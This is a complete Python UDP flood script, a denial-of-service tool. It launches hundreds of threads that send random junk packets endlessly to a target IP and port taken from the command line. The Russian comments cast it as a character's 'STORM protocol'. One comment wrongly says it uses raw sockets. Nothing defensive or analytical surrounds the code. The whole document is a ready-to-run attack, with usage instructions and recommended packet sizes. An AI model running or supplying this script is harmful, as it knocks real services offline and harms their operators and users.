
import socket
import random
import threading
import sys

# Найт переходит на сырые сокеты. Это требует прав администратора.
def storm_worker(ip, port, size):
    # Создаем UDP сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Генерируем случайный мусор заданного размера
    data = random._urandom(size)
    
    while True:
        try:
            # Бьем по порту без остановки
            sock.sendto(data, (ip, port))
        except Exception:
            # Если буфер переполнен, просто пробуем еще раз через наносекунду
            continue

def run_storm(ip, port, threads_count, packet_size):
    print(f"[!] Инициализация протокола ШТОРМ на {ip}:{port}")
    print(f"[*] Пакет: {packet_size} байт | Потоков: {threads_count}")
    
    # Найт запускает армаду потоков
    for i in range(threads_count):
        t = threading.Thread(target=storm_worker, args=(ip, port, packet_size))
        t.daemon = True
        t.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[+] Шторм утихает.")

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Использование: python storm.py <ip> <port> <threads> <packet_size>")
        print("Пример: python storm.py 192.168.1.1 80 500 1024")
    else:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
        threads = int(sys.argv[3])
        size = int(sys.argv[4]) # Рекомендую от 1024 до 65500
        run_storm(target_ip, target_port, threads, size)
